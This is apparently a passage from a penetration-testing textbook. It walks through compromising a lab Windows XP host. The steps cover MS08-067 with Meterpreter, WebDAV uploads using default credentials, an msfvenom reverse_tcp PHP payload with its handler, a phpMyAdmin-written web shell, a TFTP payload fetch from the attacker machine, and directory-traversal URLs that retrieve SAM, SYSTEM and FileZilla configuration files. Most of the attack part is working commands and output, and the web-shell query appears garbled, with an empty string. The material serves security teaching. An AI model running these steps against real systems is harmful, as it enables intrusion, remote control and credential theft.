### Exploiting MS08-067 with a Meterpreter Payload

The following steps outline the process of exploiting the MS08-067 vulnerability on a Windows XP SP3 English (AlwaysOn NX) target using Metasploit:

1. **Target Selection:**
   - Selected Target: Windows XP SP3 English (AlwaysOn NX)

2. **Triggering the Vulnerability:**
   - Attempting to trigger the vulnerability...

3. **Sending the Stage:**
   - Sending Stage to 192.168.20.10...

4. **Meterpreter Session:**
   - Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:4312) at 2015-01-12 00:11:58 -0500

**Listing 8-1: Exploiting MS08-067 with a Meterpreter Payload**

As the output shows, running this exploit should open a Meterpreter session that we can use for post-exploitation activities.

### Exploiting WebDAV Default Credentials

In Chapter 6, we discovered that the XAMPP installation on our Windows XP target uses default login credentials for the WebDAV folder, allowing us to upload files to the web server. We verified this vulnerability using Cadaver, a command-line client for WebDAV.

1. **Create a Test File:**
   ```bash
   root@kali:~# cat test.txt
   test
   ```

2. **Authenticate with WebDAV:**
   ```bash
   root@kali:~# cadaver http://192.168.20.10/webdav
   Authentication required for XAMPP with WebDAV on server `192.168.20.10':
   Username: wampp
   Password:
   dav:/webdav/>
   ```

3. **Upload the Test File:**
   ```bash
   dav:/webdav/> put test.txt
   Uploading test.txt to `/webdav/test.txt':
   Progress: [=============================>] 100.0% of 5 bytes succeeded.
   dav:/webdav/>
   ```

If you browse to `/webdav/test.txt`, you should see that the text file has been successfully uploaded to the website, as shown in Figure 8-1.

**Figure 8-1: A file uploaded with WebDAV**

### Running a Script on the Target Web Server

A simple text file is not very useful. It would be more beneficial if we could upload and execute a script on the web server, allowing us to run commands on the underlying systemâ€™s Apache web server. If Apache is installed as a system service, it will have system-level privileges, which we can use to gain maximum control over the target. If not, Apache will run with the privileges of the user who started it.

1. **Confirm Script Upload Permissions:**
   - Since we found phpMyAdmin software on this web server in Chapter 6, we know that the XAMPP software includes PHP. If we upload and execute a PHP file, we should be able to run commands on the system using PHP.

2. **Upload a PHP File:**
   ```bash
   dav:/webdav/> put test.php
   Uploading test.php to `/webdav/test.php':
   Progress: [=============================>] 100.0% of 5 bytes succeeded.
   dav:/webdav/>
   ```

**Note:** Some open WebDAV servers allow uploading text files but block script files like `.asp` or `.php`. Fortunately, that is not the case here, and we successfully uploaded `test.php`.

### Uploading a Msfvenom Payload

We can also use Msfvenom to generate a standalone Metasploit payload to upload to the server. Here are the steps:

1. **List Available PHP Payloads:**
   ```bash
   root@kali:~# msfvenom -l payloads
   ```

2. **Select and Generate the Payload:**
   - We choose `php/meterpreter/reverse_tcp`.
   - Set the options `LHOST` and `LPORT`:
     ```bash
     root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2323 -f raw > meterpreter.php
     ```

3. **Upload the Payload:**
   ```bash
   dav:/webdav/> put meterpreter.php
   Uploading meterpreter.php to `/webdav/meterpreter.php':
   Progress: [=============================>] 100.0% of 1317 bytes succeeded.
   ```

4. **Set Up a Handler in Msfconsole:**
   ```bash
   msf > use multi/handler
   msf exploit(handler) > set payload php/meterpreter/reverse_tcp
   msf exploit(handler) > set LHOST 192.168.20.9
   msf exploit(handler) > set LPORT 2323
   msf exploit(handler) > exploit
   ```

5. **Execute the Payload:**
   - Running the uploaded payload by opening it in a web browser should provide us with a Meterpreter session:
     ```bash
     [*] Sending stage (39217 bytes) to 192.168.20.10
     [*] Meterpreter session 2 opened (192.168.20.9:2323 -> 192.168.20.10:1301) at 2015-01-07 17:27:44 -0500
     meterpreter >
     ```

6. **Check Privileges:**
   ```bash
   meterpreter > getuid
   BOOKXP\SYSTEM
   ```

We now have system privileges, allowing us to take complete control of the Windows system.

### Exploiting Open phpMyAdmin

The same XAMPP platform includes an open phpMyAdmin install, which we can exploit to run commands on the database server. The MySQL server will have either system privileges (if it is installed as a Windows service) or the privileges of the user that started the MySQL process.

1. **Access phpMyAdmin:**
   - Navigate to `http://192.168.20.10/phpmyadmin` and click the SQL tab.

2. **Write a Script to the Web Server:**
   - Use a SQL `SELECT` statement to output a PHP script to a file on the web server:
     ```sql
     SELECT "" into outfile "C:\\xampp\\htdocs\\shell.php"
     ```

3. **Run the Query:**
   - After running the query, browse to `http://192.168.20.10/shell.php` and supply a `cmd` parameter to execute commands on the target system.

### Downloading a File with TFTP

We can use TFTP to upload a more complicated PHP script to the web server.

1. **Start Atftpd TFTP Server:**
   ```bash
   root@kali:~# atftpd --daemon --bind-address 192.168.20.9 /tmp
   ```

2. **Download the File:**
   - Set the `cmd` parameter in the `shell.php` script:
     ```bash
     http://192.168.20.10/shell.php?cmd=tftp 192.168.20.9 get meterpreter.php C:\\xampp\\htdocs\\meterpreter.php
     ```

3. **Open a Meterpreter Shell:**
   - Browse to `http://192.168.20.10/meterpreter.php` to open a Meterpreter shell.

### Downloading Sensitive Files

Recall from Chapter 6 that our Zervit server on port 3232 has a directory traversal issue that allows us to download files from the remote system without authentication.

1. **Download the Windows Boot.ini Configuration File:**
   - Use the URL: `http://192.168.20.10:3232/index.html?../../../../../../boot.ini`

2. **Download the FileZilla Configuration File:**
   - Use the URL: `http://192.168.20.10:3232/index.html?../../../../../../xampp/FileZillaFtp/FileZilla%20Server.xml`

3. **Download the Windows SAM and SYSTEM Files:**
   - Use the URLs:
     - `http://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/system`
     - `http://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/sam`

### Exploiting a Buffer Overflow in Third-Party Software

In Chapter 6, we explored the SLMail server on our target. Let's continue with the exploitation of a buffer overflow in third-party software.